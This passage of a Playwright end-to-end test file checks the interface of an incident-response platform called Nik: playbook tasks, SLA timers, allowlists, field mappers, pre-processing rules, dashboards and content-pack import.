  await expect(room.getByLabel('Arguments of the command')).toContainText('value=')
  await line.pressSequentially('185.220.101.47')
  await line.press('Enter')
  const result = stream
    .getByRole('listitem')
    .filter({ hasText: /nik-get-indicator/ })
    .nth(1)
  await expect(result).toBeVisible({ timeout: 20_000 })
  await result.getByRole('button').first().click()
  const inspector = room.getByRole('complementary', { name: 'The chosen entry' })
  await expect(inspector.getByRole('heading', { name: 'Result' })).toBeVisible()
  // Nothing here is evidence of anything.
  await expect(inspector.getByRole('button', { name: /evidence/i })).toHaveCount(0)
  await inspector.getByRole('button', { name: 'Close the entry' }).click()

  // A note to oneself; what is about an incident is refused, and is not offered.
  await line.fill('try the mail instance tomorrow')
  await line.press('Enter')
  await expect(stream).toContainText('try the mail instance tomorrow')
  await line.fill('/')
  await expect(room.getByRole('listbox', { name: 'Commands' }).getByRole('option')).toHaveText([/\/note/])
  await line.fill('/close')
  await line.press('Enter')
  await expect(room.getByRole('alert').filter({ hasText: 'about an incident' })).toBeVisible()
  await room.getByRole('group', { name: 'Show' }).getByRole('button', { name: 'Notes' }).click()
  await expect(stream.getByRole('listitem').filter({ hasText: 'nik-get-indicator' })).toHaveCount(0)
  await expect(stream).toContainText('try the mail instance tomorrow')
  await room.getByRole('group', { name: 'Show' }).getByRole('button', { name: 'All' }).click()

  // A command that changes something outside asks first, here too.
  await line.fill('!acme-create-ticket title="From the Playground"')
  await line.press('Enter')
  const confirm = page.getByRole('dialog', { name: 'Run this command?' })
  await expect(confirm).toContainText('acme-create-ticket changes something outside Nik')
  await confirm.getByRole('button', { name: 'Cancel' }).click()

  // The history is cleared by who owns it; no incident was made or touched.
  await room.getByRole('button', { name: 'Clear the history' }).click()
  await page
    .getByRole('dialog', { name: 'Clear the history?' })
    .getByRole('button', { name: 'Clear', exact: true })
    .click()
  await expect(stream).toContainText('Nothing here yet')
  expect((await (await page.request.get('/api/playground')).json()).entries).toEqual([])
  expect((await (await page.request.get('/api/incidents')).json()).incidents.length).toBe(before)
  await room.getByRole('button', { name: 'Close the playground' }).click()
  await expect(page).not.toHaveURL(/\/playground/)
})

test('a playbook gives tasks and asks questions: My tasks, the work plan of the incident, a task added by hand', async () => {
  test.setTimeout(240_000) // the worker takes a step every second or so
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/')[2])
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')

  // A playbook that asks a question, then gives a task, then writes a note (made through the API).
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Laptop plan' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const graph = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      {
        id: 'encrypted',
        kind: 'ask',
        name: 'Encrypted?',
        position: { x: 40, y: 160 },
        config: {
          question: 'Is the disk of {{ incident.name }} encrypted?',
          choices: ['Yes', 'No'],
          inputs: [{ name: 'serial', label: 'Serial number', type: 'text', required: true }],
          assignee: { role: 'admin' },
          phase: 'Triage',
        },
      },
      {
        id: 'collect',
        kind: 'task',
        name: 'Collect',
        position: { x: 40, y: 280 },
        config: {
          title: 'Collect the laptop {{ encrypted.values.serial }}',
          instructions: 'Bag it and **label** it.\n\n- seal the bag\n- sign the form',
          assignee: { role: 'admin' },
          due: '2h',
          phase: 'Containment',
        },
      },
      {
        id: 'note',
        kind: 'action',
        name: 'Write it down',
        position: { x: 40, y: 400 },
        config: { action: 'nik.add-note', args: { text: 'Collected by {{ collect.by }}: {{ collect.comment }}' } },
      },
    ],
    edges: [
      { from: 'start', to: 'encrypted' },
      { from: 'encrypted', port: 'yes', to: 'collect' },
      { from: 'collect', port: 'done', to: 'note' },
    ],
  }
  const saved = await page.request.post(`/api/automation/playbooks/${playbookId}/versions`, { data: { graph } })
  expect(saved.status(), await saved.text()).toBe(201)
  const started = await page.request.post(`/api/automation/playbooks/${playbookId}/run`, {
    data: { objectKind: 'incident', objectId: incidentId },
  })
  expect(started.status(), await started.text()).toBe(201)
  await expect
    .poll(async () => (await (await page.request.get('/api/tasks/count')).json()).mine, { timeout: 30_000 })
    .toBe(1)

  // My tasks: the question waits there, with its form. It cannot be sent until it is filled.
  await page.getByRole('button', { name: /^My tasks/ }).click()
  await expect(page).toHaveURL(/\/tasks\/[0-9a-f]+$/)
  const mine = page.getByRole('region', { name: 'My tasks' })
  await expect(mine.getByRole('list', { name: 'Tasks' }).getByRole('listitem')).toHaveCount(1)
  const card = mine.getByRole('article')
  await expect(card.getByRole('heading', { level: 2 })).toHaveText(/^Is the disk of WKS-FINANCE-01.* encrypted\?$/)
  await expect(card).toContainText('For the role admin')
  const send = card.getByRole('button', { name: 'Send the answer' })
  await expect(send).toBeDisabled()
  await expect(card).toContainText('Still needed: a choice, Serial number')
  await card.getByText('Yes', { exact: true }).click()
  await card.getByLabel(/Serial number/).fill('PF-3X1')
  await send.click()
  await expect(card.getByRole('region', { name: 'What was answered' })).toContainText('Answer')
  await expect(card.getByRole('region', { name: 'What was answered' })).toContainText('PF-3X1')
  // The incident it belongs to is one click away.
  await card.getByRole('button', { name: /WKS-FINANCE-01/ }).click()
  await expect(page).toHaveURL(/\/incident\//)

  // The work plan of the incident: the steps of the playbook under its phases, each with what happened.
  await tabs.getByRole('button', { name: 'Work plan', exact: true }).click()
  const plan = page.getByRole('region', { name: 'Plan of Laptop plan' })
  await expect(plan.getByRole('group', { name: 'Triage' })).toContainText('answered')
  const containment = plan.getByRole('group', { name: 'Containment' })
  const open = containment.getByRole('button', { name: 'Open the task Collect the laptop PF-3X1' })
  await expect(open).toBeVisible({ timeout: 30_000 })
  await expect(open).toContainText('to do')
  await expect(open).toContainText('due in 2 h')
  await expect(plan.getByRole('group', { name: 'Other steps' })).toContainText('not reached')

  // The same plan as the graph of the playbook, and back.
  const how = page.getByRole('group', { name: 'Show the plan as' })
  await how.getByRole('button', { name: 'Graph' }).click()
  await expect(plan.getByTestId('playbook-canvas')).toContainText('Collect')
  await expect(plan.getByTestId('playbook-canvas')).toContainText('for the role admin')
  await how.getByRole('button', { name: 'List' }).click()

  // The task is done from the plan: its instructions, a comment.
  await open.click()
  const dialog = page.getByRole('dialog', { name: 'Task' })
  await expect(dialog.getByRole('region', { name: 'Instructions' }).locator('strong')).toHaveText('label')
  await expect(dialog.getByRole('region', { name: 'Instructions' }).getByRole('listitem')).toHaveCount(2)
  await dialog.getByLabel('Comment').fill('In the safe')
  await dialog.getByRole('button', { name: 'Mark as done' }).click()
  await expect(dialog.getByRole('region', { name: 'What was answered' })).toContainText('In the safe')
  await dialog.getByRole('button', { name: 'Close' }).click()
  // The playbook goes on to its end.
  await expect(plan).toContainText('3 of 3 steps', { timeout: 30_000 })
  await expect(plan.getByRole('group', { name: 'Other steps' })).toContainText('done')

  // A task added by hand, for the owner of the incident.
  await page.getByRole('button', { name: 'Add a task' }).click()
  const adding = page.getByRole('dialog', { name: 'Add a task' })
  await adding.getByLabel(/What to do/).fill('Tell legal')
  await adding.getByLabel('Due in').fill('3d')
  await adding.getByRole('button', { name: 'Add the task' }).click()
  const byHand = page.getByRole('region', { name: 'Tasks added by hand' })
  await expect(byHand.getByRole('button', { name: 'Open the task Tell legal' })).toContainText('due in 3 d')

  // The War Room tells it all, and the note of the playbook is there.
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  const stream = page.getByRole('list', { name: 'War Room' })
  await expect(stream.getByRole('listitem').filter({ hasText: 'done: In the safe' })).toHaveCount(1)
  await expect(stream.getByRole('listitem').filter({ hasText: /Collected by .*: In the safe/ })).toHaveCount(1)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
})

test('a type times its incidents: the SLA in Settings, the timers on the incident, what the account was told', async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/')[2])
  const incident = await (await page.request.get(`/api/incidents/${incidentId}`)).json()
  const typeId = incident.type || 'unclassified'

  // Settings → Incidents → SLA: one hour and a half to contain, for the type of the open incident.
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('SLA', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/incidents\/sla$/)
  await settings.locator('#sla-type').selectOption(typeId)
  const table = settings.getByRole('table', { name: /^The SLA of / })
  const contain = table.getByRole('row').filter({ hasText: 'time_to_contain' })
  const minutes = contain.getByLabel('Time to contain: minutes allowed', { exact: true })
  await expect(minutes).toBeDisabled()
  await contain.getByRole('checkbox').first().check()
  const save = settings.getByRole('button', { name: /^Save the SLA of / })
  // Switched on with no time: it says what is missing.
  await expect(settings.getByRole('alert')).toContainText('Time to contain: say how many minutes are allowed')
  await expect(save).toBeDisabled()
  await minutes.fill('90')
  await contain.getByLabel('Time to contain: minutes allowed if critical').fill('15')
  await save.click()
  await expect(settings.getByRole('status')).toContainText('Saved.')
  await page.getByRole('button', { name: 'Close platform settings' }).click()

  // The incident shows its timer beside the tabs; it is paused and started again by hand.
  const timers = page.getByRole('region', { name: 'SLA timers' })
  const timer = timers.getByRole('listitem').filter({ hasText: 'Time to contain' })
  await expect(timer).toContainText(/left · of 1 h 30 min/)
  await timer.getByRole('button', { name: 'Pause Time to contain' }).click()
  await expect(timer).toContainText('paused at')
  await timer.getByRole('button', { name: 'Start Time to contain' }).click()
  await expect(timer).toContainText(/left · of 1 h 30 min/)
  await timer.getByRole('button', { name: 'Stop Time to contain' }).click()
  await expect(timer).toContainText('took')
  await expect(timer.getByRole('button', { name: 'Stop Time to contain' })).toHaveCount(0)

  // The bell: what this account was told (the approvals and tasks of the tests before), read at once.
  const bell = page.getByRole('button', { name: /^Notifications \(\d+ new\)$/ })
  await expect(bell).toBeVisible({ timeout: 45_000 })
  await bell.click()
  const told = page.getByRole('dialog', { name: 'Notifications' })
  await expect(told.getByRole('list', { name: 'Notifications' }).getByRole('listitem').first()).toContainText('new')
  await told.getByRole('button', { name: 'Mark all as read' }).click()
  await expect(told.getByRole('button', { name: 'Mark all as read' })).toBeDisabled()
  await told.getByRole('button', { name: 'Close' }).click()
  await expect(page.getByRole('button', { name: 'Notifications', exact: true })).toBeVisible()
})

test('lists: one is made and filled, a feature is pointed at it, and what Nik ships is there', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Lists', { exact: true }).last().click()
  await expect(page).toHaveURL(/\/settings\/lists\/all/)
  const table = settings.getByRole('table', { name: 'Lists' })
  // What the settings held is here: the allowlist, the keywords with their columns, the business hours.
  await expect(table.getByRole('row').filter({ hasText: 'ioc_allowlist' })).toContainText('Values')
  await table.getByRole('button', { name: 'Suspicious keywords' }).click()
  const keywords = settings.getByRole('article', { name: 'Suspicious keywords' })
  await expect(keywords.getByRole('columnheader', { name: 'Severity' })).toBeVisible()
  await expect(keywords.getByRole('region', { name: 'Where it is used' })).toContainText('Detection rules')
  await table.getByRole('button', { name: 'Business hours' }).click()
  await expect(
    settings.getByRole('article', { name: 'Business hours' }).getByLabel('The document, as JSON'),
  ).toHaveValue(/"startHour"/)

  // A list of one's own.
  await settings.getByRole('button', { name: 'New list' }).click()
  const dialog = page.getByRole('dialog', { name: 'New list' })
  await dialog.getByLabel('Label').fill('Strict allowlist')
  await expect(dialog.getByLabel('Name')).toHaveValue('strict_allowlist')
  await dialog.getByRole('button', { name: 'Create the list' }).click()
  const strict = settings.getByRole('article', { name: 'Strict allowlist' })
  await expect(strict).toContainText('Nothing reads this list yet.')
  await strict.getByLabel('Items, one a line').fill('only.example\n\nonly.example\n192.0.2.0/24')
  await strict.getByRole('button', { name: 'Save the items' }).click()
  await expect(strict.getByRole('status')).toHaveText('Saved.')
  await expect(strict.getByLabel('Items, one a line')).toHaveValue('only.example\n192.0.2.0/24')
  await expect(table.getByRole('row').filter({ hasText: 'strict_allowlist' })).toContainText('2 items')
  const exported = await page.request.get('/api/lists/strict_allowlist/export?format=csv')
  expect(await exported.text()).toBe('key,note\r\nonly.example,\r\n192.0.2.0/24,\r\n')

  // The allowlist of the indicators reads it when it is chosen, and the factory one when it is chosen back.
  await sections.getByText('IOC allowlist', { exact: true }).click()
  const picker = settings.getByLabel('Allowlist: reads the list')
  await expect(picker).toHaveValue('ioc_allowlist')
  await picker.selectOption('strict_allowlist')
  // The list just chosen is saved and read again before its entries are counted.
  await expect(settings.getByText('2 entries')).toBeVisible({ timeout: 20_000 })
  await sections.getByText('Lists', { exact: true }).last().click()
  await table.getByRole('button', { name: 'Strict allowlist' }).click()
  await expect(strict.getByRole('region', { name: 'Where it is used' })).toContainText('Allowlist')
  // A list in use is not deleted.
  await strict.getByRole('button', { name: 'Delete the list' }).click()
  await expect(strict.getByRole('alert')).toContainText('This list is used by')
  await sections.getByText('IOC allowlist', { exact: true }).click()
  await picker.selectOption('ioc_allowlist')
  await expect(settings.getByText('2 entries')).toHaveCount(0)
  await sections.getByText('Lists', { exact: true }).last().click()
  await table.getByRole('button', { name: 'Strict allowlist' }).click()
  await strict.getByRole('button', { name: 'Delete the list' }).click()
  await expect(table.getByRole('row').filter({ hasText: 'strict_allowlist' })).toHaveCount(0)
  await page.getByRole('button', { name: 'Close platform settings' }).click()
})

test('a mapper says how the names of a product become those of Nik, tried on a sample; a classifier chooses the type', async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/')[2])
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByText('Classifiers and mappers', { exact: true })
    .click()
  await expect(page).toHaveURL(/\/settings\/automation\/classifiers-and-mappers$/)
  await settings.getByLabel('Connector', { exact: true }).selectOption('acme')
  await expect(settings.getByText('no mapper yet')).toBeVisible()

  // A sample of what the product sends, and two rules written against it.
  await settings
    .getByLabel('A sample item, as JSON')
    .fill('{"id": "T-77", "title": "Emotet on a laptop", "priority": 1, "host": {"name": "WKS-FINANCE-01"}}')
  const rules = settings.getByRole('table', { name: 'Rules of the incoming mapper' })
  await settings.getByRole('button', { name: /^Show the \d+ other fields$/ }).click()
  const name = rules.getByRole('row').filter({ hasText: /^Name/ })
  // The connector names no field: the picker offers those of the sample.
  await name.getByLabel('Name: its value: put a field in').selectOption('title')
  await expect(name.getByLabel('Name: its value', { exact: true })).toHaveValue('{{ item.title }}')
  const severity = rules.getByRole('row').filter({ hasText: /^Severity/ })
  await severity.getByLabel('Severity: its value', { exact: true }).fill("{{ item.priority | severity('inverse') }}")
  await severity.getByLabel('Severity: wins over what a person set').check()
  const host = rules.getByRole('row').filter({ hasText: /^Host/ })
  await host.getByLabel('Host: its value', { exact: true }).fill('{{ item.host.name }}')
  await settings.getByRole('button', { name: 'Add a context path' }).click()
  await settings.getByLabel('Context path 1', { exact: true }).fill('Alert(val.ID == obj.ID)')
  await settings.getByLabel('Context path 1: its value', { exact: true }).fill('{"ID": "{{ item.id }}"}')

  // Tried on the sample: each row shows the value the incident would get. Nothing is written.
  await settings.getByRole('button', { name: 'Try on the sample' }).first().click()
  await expect(name).toContainText('Emotet on a laptop')
  await expect(severity).toContainText('critical')
  await expect(host).toContainText('WKS-FINANCE-01')
  await expect(rules.getByRole('row').filter({ hasText: 'T-77' })).toHaveCount(1)
  await settings.getByRole('button', { name: 'Save the mapper' }).click()
  await expect(settings.getByRole('status').filter({ hasText: 'The mapper is saved.' })).toBeVisible()
  await expect(settings.getByText('saved', { exact: true })).toBeVisible()

  // What a field refuses is said, and the rest goes on.
  await severity.getByLabel('Severity: its value', { exact: true }).fill('{{ item.title }}')
  await settings.getByRole('button', { name: 'Try on the sample' }).first().click()
  await expect(settings.getByRole('status').filter({ hasText: 'Severity' })).toBeVisible()
  await expect(name).toContainText('Emotet on a laptop')

  // The classifier of the connection: the first rule that holds gives the type.
  const classifier = settings.getByRole('region', { name: 'Classifier of Acme test' })
  await classifier.getByRole('button', { name: 'Add a rule' }).click()
  await classifier.getByLabel('Rule 1: what to compare', { exact: true }).fill('{{ item.title }}')
  await classifier.getByLabel('Rule 1: how').selectOption('contains')
  await classifier.getByLabel('Rule 1: with what').fill('Emotet')
  await classifier.getByLabel('Rule 1: the type it becomes').selectOption('malware')
  await classifier.getByRole('button', { name: 'Try on the sample' }).click()
  await expect(classifier.getByRole('status').filter({ hasText: 'The sample becomes' })).toContainText('Malware')
  await classifier.getByRole('button', { name: 'Save the classifier' }).click()
  await expect(classifier.getByRole('status').filter({ hasText: 'The classifier is saved.' })).toBeVisible()

  // The other way: what goes to the product for an incident.
  await settings.getByRole('group', { name: 'Direction' }).getByRole('button', { name: 'Outgoing' }).click()
  await settings.getByRole('button', { name: 'Add a name' }).click()
  await settings.getByLabel('Name 1', { exact: true }).fill('summary')
  await settings.getByLabel('summary: its value', { exact: true }).fill('{{ incident.name }} ({{ incident.status }})')
  await settings.getByLabel('The id of an incident to try the mapper on').fill(incidentId)
  await settings.getByRole('button', { name: 'Try on the sample' }).click()
  await expect(settings.getByRole('table', { name: 'Rules of the outgoing mapper' })).toContainText(
    /WKS-FINANCE-01.*\(/,
  )
  await page.getByRole('button', { name: 'Close platform settings' }).click()
})

test('pre-processing rules say what becomes of a fetched item before it is an incident', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByText('Pre-processing rules', { exact: true })
    .click()
  await expect(page).toHaveURL(/\/settings\/incidents\/pre-processing$/)
  await expect(settings.getByText('No rule yet: every new item becomes an incident.')).toBeVisible()

  // A rule that drops noise.
  await settings.getByRole('button', { name: 'New rule' }).click()
  const dialog = page.getByRole('dialog', { name: 'New rule' })
  await expect(dialog.getByRole('status')).toHaveText('Give the rule a name')
  await dialog.getByLabel('Name').fill('Port scans are noise')
  await dialog.getByLabel('What to compare').fill('{{ item.title }}')
  await dialog.getByLabel('How it compares').selectOption('contains')
  await dialog.getByLabel('With what').fill('Port scan')
  await dialog.getByRole('button', { name: 'Save the rule' }).click()
  // One that needs to know which incident is the same.
  await settings.getByRole('button', { name: 'New rule' }).click()
  await dialog.getByLabel('Name').fill('Same host, same case')
  await dialog.getByLabel('Then').selectOption('link_to_existing')
  await expect(dialog.getByRole('status')).toHaveText('Say which fields are the same in the incident to look for')
  await dialog.getByLabel('host', { exact: true }).check()
  await dialog.getByLabel(/Made in the last hours/).fill('48')
  await dialog.getByRole('button', { name: 'Save the rule' }).click()

  const rules = settings.getByRole('list', { name: 'Pre-processing rules' })
  await expect(rules.getByRole('listitem')).toHaveText([
    /Port scans are noise.*when all of 1: \{\{ item\.title \}\} contains Port scan: drop it/,
    /Same host, same case.*always: link it to the open incident with the same host made in the last 48 h/,
  ])
  // Their order is theirs to change; a rule is deleted.
  await rules.getByRole('button', { name: 'Move Same host, same case up' }).click()
  await expect(rules.getByRole('listitem').first()).toContainText('Same host, same case')
  await rules.getByRole('button', { name: 'Delete Same host, same case' }).click()
  await rules.getByRole('button', { name: 'Delete Port scans are noise' }).click()
  await expect(settings.getByText('No rule yet: every new item becomes an incident.')).toBeVisible()
  await page.getByRole('button', { name: 'Close platform settings' }).click()
})

test('Fetch status: a connection is told to fetch, says why it fails, and is let go on', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByText('Fetch status', { exact: true })
    .click()
  await expect(page).toHaveURL(/\/settings\/automation\/fetch-status$/)
  const row = settings
    .getByRole('list', { name: 'Instances that can fetch' })
    .getByRole('listitem')
    .filter({ hasText: 'Acme test' })
  await expect(row).toContainText('off')
  await expect(row).toContainText('It does not fetch.')

  await row.getByRole('button', { name: 'Turn on' }).click()
  await expect(settings.getByRole('status')).toContainText('Acme test fetches')
  await expect(row).toContainText('fetching')
  // There is no Acme Desk to answer: the cycle fails, and the page says why.
  await row.getByRole('button', { name: 'Fetch now' }).click()
  await expect(row).toContainText('failing', { timeout: 30_000 })
  await expect(row.locator('.text-high-fg').first()).not.toBeEmpty()
  await row.getByRole('button', { name: 'Let it go on' }).click()
  await expect(settings.getByRole('status')).toContainText('Acme test goes on.')
  // What it fetched lately: nothing yet.
  await row.getByRole('button', { name: 'Show what Acme test fetched' }).click()
  await expect(row).toContainText('Nothing fetched yet.')
  await row.getByRole('button', { name: 'Turn off' }).click()
  await expect(row).toContainText('It does not fetch.')
  // Who is told when a connection fails: the bell holds it.
  await page.getByRole('button', { name: 'Close platform settings' }).click()
  await page.getByRole('button', { name: /^Notifications/ }).click()
  const told = page.getByRole('dialog', { name: 'Notifications' })
  // At least once: let go on, it may have failed a second time before it was turned off.
  await expect(told.getByRole('listitem').filter({ hasText: 'Fetching from Acme test fails' }).first()).toBeVisible({
    timeout: 45_000,
  })
  await told.getByRole('button', { name: 'Close' }).click()
})

test('an incident is mirrored with an object of another product, read now, and stopped', async () => {
  const mirror = page.getByRole('region', { name: 'Mirroring' })
  await mirror.getByRole('button', { name: 'Mirror with…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Mirror this incident' })
  await expect(dialog.getByRole('status')).toHaveText('Say which object of the other side this incident is')
  await dialog.getByLabel('The id of the object on the other side').fill('T-77')
  // Acme Desk is read, not written to: it cannot be mirrored out.
  await dialog.getByRole('radio', { name: /^Both ways/ }).check()
  await expect(dialog.getByRole('status')).toHaveText('Acme Desk is read, not written to: mirror in')
  await expect(dialog.getByRole('button', { name: 'Start mirroring' })).toBeDisabled()
  await dialog.getByRole('radio', { name: /^In/ }).check()
  await dialog.getByRole('button', { name: 'Start mirroring' }).click()
  await expect(mirror).toContainText('Acme test')
  await expect(mirror).toContainText('T-77 · read from there')
  await expect(mirror).toContainText('Not read yet')

  // There is no Acme Desk to answer: reading now says why it could not.
  await mirror.getByRole('button', { name: 'Read now' }).click()
  await expect(mirror.getByRole('alert')).not.toBeEmpty({ timeout: 30_000 })
  // The War Room tells who started it.
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  await expect(
    page
      .getByRole('list', { name: 'War Room' })
      .getByRole('listitem')
      .filter({ hasText: 'started mirroring with Acme test' }),
  ).toHaveCount(1)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await mirror.getByRole('button', { name: 'Stop' }).click()
  await expect(mirror.getByRole('button', { name: 'Mirror with…' })).toBeVisible()
})

test('a dashboard is built from widgets, shows real numbers, and opens what is behind one', async () => {
  await page.getByRole('button', { name: 'Dashboards', exact: true }).click()
  const boards = page.getByRole('region', { name: 'Dashboards' })
  await expect(page).toHaveURL(/\/dashboards/)
  await boards.getByRole('button', { name: 'New', exact: true }).click()
  const name = boards.getByRole('textbox', { name: 'The name of the dashboard' })
  await expect(name).toHaveValue('New dashboard')
  await name.fill('Shift board')

  // A number: how many incidents there are.
  await boards.getByRole('button', { name: 'Add a widget' }).click()
  await page
    .getByRole('dialog', { name: 'Add a widget' })
    .getByRole('button', { name: /^Number/ })
    .click()
  const editor = page.getByRole('dialog', { name: 'Edit the widget' })
  await editor.getByLabel('Title').fill('Incidents now')
  // The preview asks with the real data of who edits.
  await expect(editor.getByRole('region', { name: 'Preview' })).toContainText(/\d/)
  await editor.getByRole('button', { name: 'Done' }).click()

  // Bars: incidents for each status.
  await boards.getByRole('button', { name: 'Add a widget' }).click()
  await page.getByRole('dialog', { name: 'Add a widget' }).getByRole('button', { name: /^Bars/ }).click()
  await editor.getByLabel('Title').fill('By status')
  await editor.getByLabel('For each').selectOption('status')
  await expect(editor.getByRole('region', { name: 'Preview' })).toContainText('open')
  await editor.getByRole('button', { name: 'Done' }).click()

  // The keyboard moves a widget on the grid: the bars go beside the number, then back under it.
  const grip = boards.getByRole('button', { name: /^Move By status/ })
  await grip.focus()
  await page.keyboard.press('ArrowRight')
  await expect(boards.locator('p[aria-live="polite"]')).toContainText('By status: column 2')
  await page.keyboard.press('ArrowLeft')
  await expect(boards.locator('p[aria-live="polite"]')).toContainText('By status: column 1')

  await boards.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(boards.getByRole('heading', { name: 'Shift board' })).toBeVisible()
  await expect(boards.getByText('Only you')).toBeVisible()
  await expect(page).toHaveURL(/\/dashboards\/[0-9a-f]{32}$/)
  const number = boards.getByRole('article', { name: 'Incidents now' })
  await expect(number.getByRole('button', { name: /^Incidents now: \d+\. Show them\.$/ })).toBeVisible()
  const bars = boards.getByRole('article', { name: 'By status' })
  await expect(bars.getByRole('listitem').first()).toContainText('open')

  // The same figures as a table.
  await bars.getByRole('button', { name: 'Show By status as a table' }).click()
  await expect(bars.getByRole('table')).toContainText('open')
  await bars.getByRole('button', { name: 'Show By status as a chart' }).click()

  // What is behind a number: the query, and the incidents themselves.
  await number.getByRole('button', { name: /Show them/ }).click()
  const behind = page.getByRole('dialog', { name: 'Incidents now' })
  await expect(behind).toContainText(/\d+ objects?/)
  await expect(behind.getByRole('table')).toContainText('WKS-FINANCE-01')
  await behind.getByRole('button', { name: 'Close' }).click()

  await boards.getByRole('button', { name: 'Delete', exact: true }).click()
  await page.getByRole('dialog', { name: 'Delete "Shift board"?' }).getByRole('button', { name: 'Delete' }).click()
  await expect(page.getByRole('navigation', { name: 'Your dashboards' }).getByText('Shift board')).toHaveCount(0)
  await page.getByRole('button', { name: 'Close dashboards' }).first().click()
  await expect(page.getByRole('region', { name: 'Dashboards' })).toHaveCount(0)
})

test('a content pack is inspected, shown with what it would change, and imported whole', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings
    .getByRole('navigation', { name: 'Settings sections' })
    .getByText('Content packs', { exact: true })
    .click()
  await expect(page).toHaveURL(/\/settings\/automation\/content-packs$/)
  // What Nik ships is listed as packs.
  const installed = settings.getByRole('list', { name: 'Installed packs' })
  await expect(installed.getByRole('listitem').filter({ hasText: 'Nik: automation' })).toContainText('part of Nik')

  // A pack made by hand: a list, and a field that clashes with one Nik has.
  const zip = await page.evaluate(async () => {
    const files = {
      'pack.yml': 'id: e2e-pack\nname: E2E pack\nversion: 1.0.0\ndescription: Made by the test.\n',
      'lists/e2e_vips.json': JSON.stringify({
        name: 'e2e_vips',
        label: 'E2E VIPs',
        kind: 'values',
        entries: [{ key: 'ceo' }],
      }),
      'fields/severity.json': JSON.stringify({ name: 'severity', label: 'Mine', type: 'text' }),
    }
    // A zip with stored (uncompressed) entries, built here: the browser has no zip writer.
    const encoder = new TextEncoder()
    const table = new Uint32Array(256).map((_, n) => {
      let c = n
      for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1
      return c >>> 0
    })
    const crc = (bytes) => {
      let c = 0xffffffff
      for (const byte of bytes) c = table[(c ^ byte) & 0xff] ^ (c >>> 8)
      return (c ^ 0xffffffff) >>> 0
    }
    const parts = []
    const central = []
    let offset = 0
    for (const [name, text] of Object.entries(files)) {
      const nameBytes = encoder.encode(name)
      const data = encoder.encode(text)
      const head = new DataView(new ArrayBuffer(30))
      head.setUint32(0, 0x04034b50, true)
      head.setUint16(4, 20, true)
      head.setUint32(14, crc(data), true)
      head.setUint32(18, data.length, true)
      head.setUint32(22, data.length, true)
      head.setUint16(26, nameBytes.length, true)
      parts.push(new Uint8Array(head.buffer), nameBytes, data)
      const entry = new DataView(new ArrayBuffer(46))
      entry.setUint32(0, 0x02014b50, true)
      entry.setUint16(4, 20, true)
      entry.setUint16(6, 20, true)
      entry.setUint32(16, crc(data), true)
      entry.setUint32(20, data.length, true)
      entry.setUint32(24, data.length, true)
      entry.setUint16(28, nameBytes.length, true)
      entry.setUint32(42, offset, true)
      central.push(new Uint8Array(entry.buffer), nameBytes)
      offset += 30 + nameBytes.length + data.length
    }
    const size = central.reduce((sum, part) => sum + part.length, 0)
    const end = new DataView(new ArrayBuffer(22))
    end.setUint32(0, 0x06054b50, true)
    end.setUint16(8, Object.keys(files).length, true)
    end.setUint16(10, Object.keys(files).length, true)
    end.setUint32(12, size, true)
    end.setUint32(16, offset, true)
    const all = [...parts, ...central, new Uint8Array(end.buffer)]
    const out = new Uint8Array(all.reduce((sum, part) => sum + part.length, 0))
    let at = 0
    for (const part of all) {
      out.set(part, at)
      at += part.length
    }
    return Array.from(out)
  })
  const packFile = { name: 'e2e.nikpack', mimeType: 'application/zip', buffer: Buffer.from(zip) }
  await settings.getByLabel('A pack file').setInputFiles(packFile)
  const plan = settings.getByRole('region', { name: 'What importing E2E pack would do' })
  await expect(plan).toContainText('Not installed yet. 1 to add, 1 in conflict.')
  const items = plan.getByRole('list', { name: 'The items of the pack' }).getByRole('listitem')
  await expect(items.filter({ hasText: 'e2e_vips' })).toContainText('add')
  // The field cannot be applied, says why, and starts left out: the rest can go in.
  const clash = items.filter({ hasText: 'severity' })
  await expect(clash).toContainText('conflict')
  await expect(clash).toContainText('Nik has a field of its own with this name')
  await expect(clash.getByRole('checkbox')).not.toBeChecked()
  // Put back, it stops the import.
  await clash.getByRole('checkbox').check()
  await expect(plan.getByRole('button', { name: /^Import/ })).toBeDisabled()
  await expect(plan).toContainText('conflicts: leave it out to go on')
  await clash.getByRole('checkbox').uncheck()
  await plan.getByRole('button', { name: 'Import (1 change)' }).click()
  await expect(settings.getByRole('status')).toContainText(
    'E2E pack 1.0.0 is installed: 1 added, 0 updated, 1 left out.',
  )

  // It is listed with what came from it, and the list is in Lists.
  const row = installed.getByRole('listitem').filter({ hasText: 'E2E pack' })
  await expect(row).toContainText('1 item')
  await row.getByRole('button', { name: 'Show what came from E2E pack' }).click()
